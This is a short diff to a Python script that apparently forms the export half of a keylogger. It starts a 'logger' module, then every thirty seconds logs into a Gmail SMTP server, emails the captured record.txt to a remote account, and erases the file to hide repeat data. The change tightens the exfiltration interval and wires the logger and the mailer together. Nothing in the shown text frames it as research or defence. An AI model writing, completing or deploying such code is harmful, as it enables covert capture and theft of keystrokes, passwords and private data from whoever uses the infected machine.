@@ -4,6 +4,7 @@ Used for exporting record.txt via email
 import smtplib
 import datetime
 import pause
+import logger
 from email import encoders
 from email.mime.base import MIMEBase
 from email.mime.multipart import MIMEMultipart
@@ -22,7 +23,7 @@ REC_PATH = "record.txt"
 
 def export():
     while True:
-        pause.minutes(5)
+        pause.seconds(30)
         # Set up connection / login to email account
         server = smtplib.SMTP('smtp.gmail.com', 587)
         server.starttls()
@@ -47,3 +48,7 @@ def export():
 
         # Erases .txt file to avoid repeat data (May interfere with actual logging..?)
         open(REC_PATH, 'w').close()
+
+if __name__ == '__main__':
+    logger.start()
+    export()
